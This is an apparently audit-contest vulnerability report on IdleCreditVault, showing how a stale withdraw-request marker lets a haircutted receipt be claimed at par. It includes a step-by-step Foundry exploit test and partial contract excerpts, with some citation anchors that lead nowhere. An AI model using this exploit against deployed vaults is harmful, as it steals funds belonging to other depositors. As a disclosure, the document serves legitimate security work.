### Title
Stale `lastWithdrawRequest` lets a loss-haircutted receipt be claimed at par by stacking a newer withdraw request - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimWithdrawRequest` routes a user's pending receipt through `_claimLossAdjustedWithdrawRequest`, which looks up the haircut only at `lastWithdrawRequest[_user]` — a single epoch marker. When a stop epoch realizes a loss via `stopEpochWithDuration`, the haircut is recorded in `lossRecoveryPriceByEpoch[lossEpoch]`, but the loss-adjusted claim path silently returns 0 for any other epoch. A user who holds a haircutted receipt from epoch N can simply file a new `requestWithdraw` in epoch N+1, which overwrites `lastWithdrawRequest[_user]` to N+1, so the loss-adjusted branch short-circuits (`lossRecoveryPriceByEpoch[N+1] == 0`) and the aggregate `withdrawsRequests[_user]` — still containing the epoch-N basis — is paid in full at par by `_claimFundedWithdrawRequest`. This is the same bug class as the NCM report: a bounds/price lookup keyed on attacker-influenced index defeats the check entirely.

### Finding Description
In `collectWithdrawFunds`, when the borrower under-funds pending withdrawals, the strategy stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` and zeroes `pendingWithdraws` [1](#0-0) . Claimants are supposed to receive `claimBasis * lossRecoveryPrice / RECOVERY_FULL` via `_claimLossAdjustedWithdrawRequest` [2](#0-1) .

However, that function only inspects `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` [3](#0-2) . `lastWithdrawRequest[_user]` is overwritten on every `requestWithdraw` [4](#0-3) , and the code comments explicitly allow requesting again before claiming ("he will have to wait for another epoch to claim both requests") [5](#0-4) . The epoch-N basis is never removed from the aggregate `withdrawsRequests[_user]` because `_clearWithdrawClaimForEpoch` is only reached for the single epoch stored in `lastWithdrawRequest` [6](#0-5) . `_claimFundedWithdrawRequest` then burns and pays the whole aggregate `normalAmount` at par [7](#0-6) .

### Impact Explanation
Any tranche holder whose withdraw request was haircutted in a loss epoch can escape the haircut entirely by making a second request in a later, normally funded epoch. The stolen amount is `claimBasis_eN * (1 - lossRecoveryPrice_eN)`, paid out of strategy underlyings that were never collected for that basis — i.e. it drains funds reserved for other pending/funded claimants or forces the vault into insolvency for later claims. No privileged or malicious role is needed: only an ordinary KYC'd lender calling `requestWithdraw` twice and `claimWithdrawRequest` once. This breaks the loss-waterfall invariant: a loss the protocol intended to socialize onto pending redeemers is instead shifted onto remaining LPs/claimants.

### Likelihood Explanation
High when losses occur. `stopEpochWithDuration` with `_lossAmount > 0` is a supported flow (BB-first loss with pro-rata pending-receipt haircut) exercised by tests such as `testProcessWithdrawalClaimsWithZeroRoundedQueuePayout` [8](#0-7) . The attack requires only that the user not claim in the loss epoch and file a second request — both unprivileged actions — and that `defaultRecoveryInitialized` is true and no default has been finalized (otherwise the defaulted branch applies). `_transferFundedClaim`'s reserve guard only protects `defaultRecoveryReserve`, not the funded pool [9](#0-8) , so it does not stop the over-payment.

### Recommendation
Track loss-adjusted claims per epoch rather than via the single `lastWithdrawRequest` marker. Concretely: iterate or record all epochs with pending basis for the user (e.g., a per-user list of request epochs, or a `lossEpoch` flag stored alongside `withdrawsRequestsByEpoch`), and in `claimWithdrawRequest` clear and pay each loss-epoch receipt at its `lossRecoveryPriceByEpoch` before falling through to `_claimFundedWithdrawRequest`. Alternatively, subtract the loss-adjusted epoch's basis from `withdrawsRequests[_user]` when the loss is recorded, keeping a separate `lossAdjustedClaims[_user]` balance that is always paid at its stored haircut regardless of `lastWithdrawRequest`.

// Foundry fork PoC against IdleCreditVault + IdleCDOEpochVariant
function testLossHaircutBypassedBySecondRequest() external {
    uint256 amount = 100_000 * ONE_SCALE;
    address alice = makeAddr('alice');

    // epoch 0 buffer: deposit and request withdraw (goes into epoch-0 receipts)
    _depositWithUser(alice, amount, true);
    vm.prank(alice);
    uint256 basis1 = cdoEpoch.requestWithdraw(0, address(AAtranche));

    _startEpochAndCheckPrices(0);

    // epoch 0 stop: borrower repays less -> loss haircut on pending receipts
    uint256 pendingBasis = strategy.pendingWithdraws();           // == basis1
    uint256 activeBasis  = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
    uint256 totalBasis   = activeBasis + pendingBasis;
    uint256 lossAmount   = totalBasis / 2;                        // 50% loss
    (uint256 pendingToFund, ) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
    deal(defaultUnderlying, borrower, repay);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), repay);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(apr, 0, cdoEpoch.epochDuration(), lossAmount);
    uint256 haircut = strategy.lossRecoveryPriceByEpoch(strategy.epochNumber());
    assertLt(haircut, 1e18);

    // alice does NOT claim. During next buffer she files a second request,
    // overwriting lastWithdrawRequest[alice] to epoch+1.
    _depositWithUser(alice, amount, true);                        // new tranche tokens
    vm.prank(alice);
    cdoEpoch.requestWithdraw(0, address(AAtranche));

    _startEpochAndCheckPrices(1);
    _stopEpochAndCheckPrices(1, apr, _expectedFundsEndEpoch());   // fully funded epoch

    // claimWithdrawRequest: loss-adjusted path sees lossRecoveryPriceByEpoch[epoch+1]==0
    // and returns 0; funded path pays the whole aggregate (epoch0 + epoch1 basis) at par.
    uint256 balPre = underlying.balanceOf(alice);
    vm.prank(alice);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(alice) - balPre;

    // Expected (correct) payout for epoch-0 basis was basis1 * haircut / 1e18.
    // Actual payout includes basis1 at par -> alice steals basis1 * (1e18 - haircut) / 1e18
    // from underlyings belonging to other claimants.
    assertGt(paid, basis1 * haircut / 1e18 + amount); // par payment of haircutted basis
}

      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);

  function _clearWithdrawClaimForEpoch(address _user, uint256 _claimEpoch, bool _isClearingApr0) internal returns (uint256 claimBasis, uint256 burnAmount) {
    (claimBasis, burnAmount) = _withdrawClaimAmountsForEpoch(_user, _claimEpoch);
    if (claimBasis == 0) return (claimBasis, burnAmount);

    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
    if (lastWithdrawRequest[_user] == _claimEpoch) {
      // The cleared epoch was the latest request marker. Any remaining normal/APR0 receipt
      // is older and already funded, so it can continue to the funded-claim path.
      lastWithdrawRequest[_user] = 0;
    }
